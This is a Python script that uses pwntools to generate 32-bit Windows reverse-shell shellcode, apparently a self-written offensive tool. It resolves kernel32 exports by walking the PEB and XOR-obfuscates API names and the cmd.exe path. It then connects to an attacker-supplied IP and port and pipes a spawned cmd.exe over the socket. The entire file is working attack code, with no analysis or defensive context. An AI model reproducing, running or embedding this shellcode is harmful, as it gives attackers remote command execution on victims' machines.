#!/usr/bin/env python3
from pwn import *
import sys, re

def str_to_stack(s):
	res = ''
	s = s.encode()
	s+=b'\x00'*(4 - (len(s)%4))
	sz = 0
	while len(s)>0:
		c = '0x'+xor(s[-4:][::-1], 0xff).hex()
		s = s[:-4]
		res+=f'''
mov eax, {c}
xor eax, 0xffffffff
push eax
'''
		sz+=4
	return res, sz




if __name__ == '__main__':
	ip = ''
	port = 1337
	out = ''
	for i in range(len(sys.argv)-1):
		if sys.argv[i] == '-i' or sys.argv[i] == '--ip':
			ip = sys.argv[i+1]
		elif sys.argv[i] == '-o' or sys.argv[i] == '--output':
			out = sys.argv[i+1]
		elif sys.argv[i] == '-p' or sys.argv[i] == '--port':
			port = int(sys.argv[i+1])
		elif sys.argv[i] == '-h' or sys.argv[i] == '--help':
			printf(f'{sys.argv[0]} -i/--ip IP -o/--output OUTFILE -p/--port PORT -h/--help')
			exit()

	if ip == '':
		print("Provide ip")
		exit()

	ip = ip.split('.')
	ip = int(hex(int(ip[3]))[2:]+hex(int(ip[2]))[2:]+hex(int(ip[1]))[2:]+hex(int(ip[0]))[2:], 16)
	ip = hex(ip)

	port = hex(port)[2:].rjust(4, '0')
	port = '0x'+port[2:]+port[:2]
	#print(port)


	code = f'''
push ebp
mov ebp, esp
sub esp, 0x50
mov eax, [fs:0x30]; PEB addr
mov eax, [eax+0xc]; PEB_LDR_DATA addr
mov eax, [eax+0x14]
mov eax, [eax]
mov eax, [eax]
mov eax, [eax+0x10]; kernel32.dll base addr
mov [ebp-4], eax; var4=kerneldll base addr
mov eax, [eax+0x3c]
add eax, [ebp-4]; new header addr
mov eax, [eax+0x78]
add eax, [ebp-4]; export table addr
mov [ebp-8], eax; var8=export table
mov eax, [eax+0x20]
add eax, [ebp-4]; name pointer table
mov [ebp-12], eax; var12=name table
mov eax, [ebp-8]
mov eax, [eax+0x24]
add eax, [ebp-4]
mov [ebp-16], eax; var16= ordinal table
mov eax, [ebp-8]
mov eax, [eax+0x1c]
add eax, [ebp-4]
mov [ebp-20], eax; var20 = addr table


mov eax, 0xffff8c8c
xor eax, 0xffffffff
push eax
mov eax, 0x9a8d9b9b
xor eax, 0xffffffff
push eax
mov eax, 0xbe9c908d
xor eax, 0xffffffff
push eax
mov eax, 0xaf8b9ab8
xor eax, 0xffffffff
push eax
mov esi, esp; GetProcAddr

xor ecx, ecx
xor eax, eax
xor ebx, ebx
.lp1:
	mov edi, [ebp-12]
	mov edi, [edi+eax*4]
	add edi, [ebp-4]
	xor ecx, ecx
	.lp2:
		mov bl, [esi+ecx]
		mov bh, [edi+ecx]
		test bl, bl
		jz .found
		inc ecx
		cmp bl, bh
		je .lp2
		inc eax
		jmp .lp1

.found:
; eax = index of func
xor ecx, ecx
mov edi, [ebp-16]
mov cx, [edi+2*eax]
mov edi, [ebp-20]
mov eax, [edi+4*ecx]
add eax, [ebp-4]
mov [ebp-8], eax; var8 = GetProcAddr

add esp, 16; were allocated for string

; WUB WUB

; Get LoadLibrary addr

mov eax, 0xffffffff
xor eax, 0xffffffff
push eax

mov eax, 0xbe868d9e
xor eax, 0xffffffff
push eax

mov eax, 0x8d9d96b3
xor eax, 0xffffffff
push eax

mov eax, 0x9b9e90b3
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-4]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-12], eax; var12 = LoadLibraryA

add esp, 16

; Load Ws2_32.dll
mov eax, 0xffff9393
xor eax, 0xffffffff
push eax

mov eax, 0x9bd1cdcc
xor eax, 0xffffffff
push eax

mov eax, 0xa0cd8ca8
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-12]
call eax
mov [ebp-16], eax; var16 = Ws2_32.dll
add esp, 12


; Initialize winsock

;WSAStartup

mov eax, 0xffff8f8a
xor eax, 0xffffffff
push eax

mov eax, 0x8b8d9e8b
xor eax, 0xffffffff
push eax

mov eax, 0xacbeaca8
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-16]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-20], eax; var20 = WsaStartup
add esp, 12

; WsaData 4 dwords?

xor eax, eax
push eax
push eax
push eax
push eax

push esp
mov eax, 0x000202
push eax
mov eax, [ebp-20]
call eax
add esp, 16
; If it fails, it fails
; I am not writing checks for avoiding possible crashes

; Create socket
mov eax, 0xffff8b9a
xor eax, 0xffffffff
push eax

mov eax, 0x949c908c
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-16]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-20], eax; var20 = socket()
add esp, 8

mov eax, 6; IPPROTO_TCP
push eax
mov eax, 1; SOCK_STREAM
push eax
mov eax, 2; AF_INET ipv4
push eax
mov eax, [ebp-20]
call eax
mov [ebp-20], eax; var20 = socket_fd

; Connect to socket

mov eax, 0xff8b9c9a
xor eax, 0xffffffff
push eax

mov eax, 0x9191909c
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-16]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-24], eax; var24 = connect()
add esp, 8

; sockaddr
; let's craft it manually))))

; 16 bytes
xor eax, eax
push eax
push eax
push eax
push eax
mov [ebp-28], esp

; sin_family
mov word ptr [esp], 2; AF_INET
; sin_port
mov word ptr [esp+2], {port}; !! big endian
; ip_addr
mov dword ptr [esp+4], {ip}; IP address !!
; rest 8 bytes are 0s


mov eax, 16
push eax
mov eax, [ebp-28]
push eax
mov eax, [ebp-20]
push eax
mov eax, [ebp-24]
call eax

; now it's time for some ass pain

mov eax, 0xffff9a8f
xor eax, 0xffffffff
push eax

mov eax, 0x96af9a8b
xor eax, 0xffffffff
push eax

mov eax, 0x9e9a8dbc
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-4]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-24], eax; var24 = CreatePipe 
add esp, 12

xor eax, eax
mov [ebp-28], eax; var28 = sock_in
mov [ebp-32], eax; var32 = sock_out
mov [ebp-36], eax; var36 = cmd_in
mov [ebp-40], eax; var40 = cmd_out

; Security_Attributes structure
push eax
push eax
push eax
mov [ebp-44], esp; var44 = sa
mov dword ptr [esp], 9; cb
mov byte ptr [esp+8], 1; InheritHandles

; Creating Pipes

xor eax, eax
push eax
mov eax, [ebp-44]
push eax
lea eax, [ebp-32]; sock_out
push eax
lea eax, [ebp-36]; cmd_in
push eax

mov eax, [ebp-24]
call eax

xor eax, eax
push eax
mov eax, [ebp-44]
push eax
lea eax, [ebp-40]; cmd_out
push eax
lea eax, [ebp-28]; sock_in
push eax

mov eax, [ebp-24]
call eax

; STARTUPINFOA 17*4 bytes
xor eax, eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov [ebp-48], esp; var48 = si

mov dword ptr [esp], 0x44; cb
mov eax, [ebp-36]
mov dword ptr [esp+0x38], eax; stdIn
mov eax, [ebp-40]
mov dword ptr [esp+0x3c], eax; stdOut
mov dword ptr [esp+0x40], eax; stdErr

mov dword ptr [esp+44], 0x00000100; dwFlags useStdHandles

; ProcessInformation 16 bytes

xor eax, eax
push eax
push eax
push eax
push eax
mov [ebp-52], esp; var52 = pi

mov eax, 0xff9a879a
xor eax, 0xffffffff
push eax

mov eax, 0xd19b929c
xor eax, 0xffffffff
push eax

mov eax, 0xa3cdcc92
xor eax, 0xffffffff
push eax

mov eax, 0x9a8b8c86
xor eax, 0xffffffff
push eax

mov eax, 0xaca38c88
xor eax, 0xffffffff
push eax

mov eax, 0x909b9196
xor eax, 0xffffffff
push eax

mov eax, 0xa8a3c5bc
xor eax, 0xffffffff
push eax

mov [ebp-56], esp; var56 = cmdline
xor eax, eax
push eax
mov [ebp-60], esp; var60 = cmdargs, for some reason needed

; CreateProcess
mov eax, 0xffffbe8c
xor eax, 0xffffffff
push eax

mov eax, 0x8c9a9c90
xor eax, 0xffffffff
push eax

mov eax, 0x8daf9a8b
xor eax, 0xffffffff
push eax

mov eax, 0x9e9a8dbc
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-4]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-64], eax; var64 = createProcess

add esp, 16

mov eax, [ebp-52]
push eax; pi
mov eax, [ebp-48]
push eax; si
xor eax, eax
push eax
push eax
push eax
inc eax
push eax; inherit handles
xor eax, eax
push eax
push eax
mov eax, [ebp-60]
push eax
mov eax, [ebp-56]
push eax

mov eax, [ebp-64]
call eax

; Close Handle
mov eax, 0xff9a939b
xor eax, 0xffffffff
push eax

mov eax, 0x919eb79a
xor eax, 0xffffffff
push eax

mov eax, 0x8c9093bc
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-4]
push eax
mov eax, [ebp-8]
call eax

mov [ebp-64], eax; var64 = CloseHandle
add esp, 12


mov eax, [ebp-36]
push eax
mov eax, [ebp-64]
call eax
mov eax, [ebp-40]
push eax
mov eax, [ebp-64]
call eax

; Get needed functions: ReadFile, WriteFile, send, recv, PeekNamedPipe var36 - ...
mov eax, 0xffffffff
xor eax, 0xffffffff
push eax

mov eax, 0x9a9396b9
xor eax, 0xffffffff
push eax

mov eax, 0x9b9e9aad
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-4]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-36], eax; var36 = ReadFile()
add esp, 12

mov eax, 0xffffff9a
xor eax, 0xffffffff
push eax

mov eax, 0x9396b99a
xor eax, 0xffffffff
push eax

mov eax, 0x8b968da8
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-4]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-40], eax; var40 = WriteFile()
add esp, 12

mov eax, 0xffffffff
xor eax, 0xffffffff
push eax

mov eax, 0x899c9a8d
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-16]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-44], eax; var44 = recv()
add esp, 8

mov eax, 0xffffffff
xor eax, 0xffffffff
push eax

mov eax, 0x9b919a8c
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-16]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-48], eax; var48 = send()
add esp, 8

;PeekNamedPipe
mov eax, 0xffffff9a
xor eax, 0xffffffff
push eax

mov eax, 0x8f96af9b
xor eax, 0xffffffff
push eax

mov eax, 0x9a929eb1
xor eax, 0xffffffff
push eax

mov eax, 0x949a9aaf
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-4]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-52], eax; var52 = PeekNamedPipe()
add esp, 16

sub esp, 1024
mov [ebp-56], esp; var56 = buf
xor eax, eax
push eax
mov [ebp-60], esp; var60 = iRead

; Let's roll
.loop:
	.read_loop:
	; ReadFile
		xor eax, eax
		push eax; lpOverlapped
		mov eax, [ebp-60]
		push eax; &iread
		mov eax, 1024
		push eax; BytesToRead
		mov eax, [ebp-56]
		push eax; buf
		mov eax, [ebp-28]
		push eax
		mov eax, [ebp-36]
		call eax

	;send
	mov eax, [ebp-60]
	mov eax, [eax]
	xor eax, eax
	push eax; lpOverlapped
	mov eax, [ebp-60]
	mov eax, [eax]
	push eax; BytesToWrite
	mov eax, [ebp-56]
	push eax; buf
	mov eax, [ebp-20]
	push eax; socket
	mov eax, [ebp-48]
	call eax

	; PeekPipe
	xor eax, eax
	push eax
	push eax
	mov eax, [ebp-60]
	push eax
	mov eax, 1024
	push eax
	mov eax, [ebp-56]
	push eax
	mov eax, [ebp-28]
	push eax

	mov eax, [ebp-52]
	call eax

	mov eax, [ebp-60]
	mov eax, [eax]
	cmp eax, 0
	jg .read_loop

	mov eax, [ebp-60]
	xor ecx, ecx
	mov dword ptr [eax], ecx

	.recv_loop:
	; recv command

	xor eax, eax
	push eax; lpOverlapped
	mov eax, 1024
	push eax; bufsize
	mov eax, [ebp-56]
	push eax; buf
	mov eax, [ebp-20]
	push eax; fd
	mov eax, [ebp-44]
	call eax
	cmp eax, 0
	je .recv_loop
	mov ecx, eax

	; Write to Pipe
	

	xor eax, eax
	push eax; lpOverlapped
	mov eax, [ebp-60]
	push eax; &iWritten
	mov eax, ecx
	push eax; BytesToWrite
	mov eax, [ebp-56]
	push eax; buf
	mov eax, [ebp-32]
	push eax; fd
	mov eax, [ebp-40]
	call eax
	mov eax, [ebp-60]
	mov eax, [eax]
	jmp .loop

.exit:
mov eax, 69
add esp, 4; iRead
add esp, 1024; buf
add esp, 32; cmdline+cmdargs
add esp, 16; processinfo
add esp, 0x44; startupinfoa
add esp, 12; Security_attributes
add esp, 16; sock_addr

add esp, 0x50
pop ebp
ret
'''

	# print(code)
	context.update(arch='i686', bits=32)
	code = re.sub(';.*\n', '\n', code)
	sc = asm(code)
	if out == '':
		print(sc)
	else:
		open(out, 'wb').write(sc)
